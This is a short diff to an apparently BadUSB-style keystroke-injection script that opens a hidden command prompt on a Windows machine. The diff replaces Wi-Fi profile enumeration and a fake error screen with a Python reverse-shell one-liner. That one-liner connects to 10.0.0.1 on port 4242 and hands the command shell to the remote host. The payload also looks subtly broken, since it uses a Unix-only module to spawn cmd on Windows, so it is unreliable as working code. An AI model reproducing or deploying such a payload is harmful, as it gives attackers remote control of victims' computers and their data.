@@ -1,21 +1,14 @@
 win+r
+\sleep 1
 cmd
 enter
+\sleep 1
 color a
 enter
 @echo off
 enter
 cls
 enter
-netsh wlan show profile
+python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));
+f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("cmd")'
 enter
-dir /s
-enter
-\sleep 1
-ctrl+c
-color c
-enter
-cls
-enter
-ERROR!
-win+ctrl+shift+b
